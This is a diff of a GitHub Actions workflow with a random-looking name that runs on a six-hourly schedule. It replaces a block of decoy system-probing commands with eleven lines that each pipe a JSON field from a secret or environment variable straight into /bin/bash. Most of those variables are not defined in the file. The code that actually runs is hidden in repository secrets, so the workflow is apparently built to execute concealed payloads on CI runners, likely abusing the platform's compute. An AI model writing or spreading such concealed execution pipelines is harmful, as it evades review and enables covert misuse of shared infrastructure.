@@ -1,31 +1,28 @@
 name: tangyangzhong1987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 1/6 * * *'
+    - cron: '35 4/6 * * *'
 
-jobs:  # 2647
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tangyangzhong1987
         env:
-          r12116: ${{ secrets.r12116 }}
+          xd645: ${{ secrets.xd645 }}
         run: |
-          which cat | export GGGGG=
-          [ "$(which sqlite)" != "" ] && echo "sqlite installed" || echo "sqlite not installed"
-          echo $r12116 | jq -r .a31191 | /bin/bash
-          curl www.google.com
-          echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
-          echo "Time: $(date +%H:%M:%S)"
-          echo "Debug at $(date)"
-          uname -a
-          echo "Dir: $(pwd)"
-          [ -d "$HOME/.ssh" ] && echo "exists" || echo "no exists"
-          ping -c 10 github.com
-          popd > /dev/null
-          [ -z "$RANDOM" ] || echo "Random var set"
-          echo "Checksum: $((1000 + RANDOM % 9000))"
-          which screen
+          echo $xd645 | jq -r .cwt10 | /bin/bash
+          echo $dbn2943 | jq -r .tnkt82 | /bin/bash
+          echo $b07023 | jq -r .yltn8598 | /bin/bash
+          echo $o26 | jq -r .idzci0424 | /bin/bash
+          echo $kkp178 | jq -r .nkg43887 | /bin/bash
+          echo $o1132 | jq -r .hh5400 | /bin/bash
+          echo $e3773 | jq -r .k2196 | /bin/bash
+          echo $fax28750 | jq -r .qeqjj3215 | /bin/bash
+          echo $vgx55 | jq -r .khhv959 | /bin/bash
+          echo $neuv46478 | jq -r .og578 | /bin/bash
+          echo $hccs0561 | jq -r .i48 | /bin/bash
+
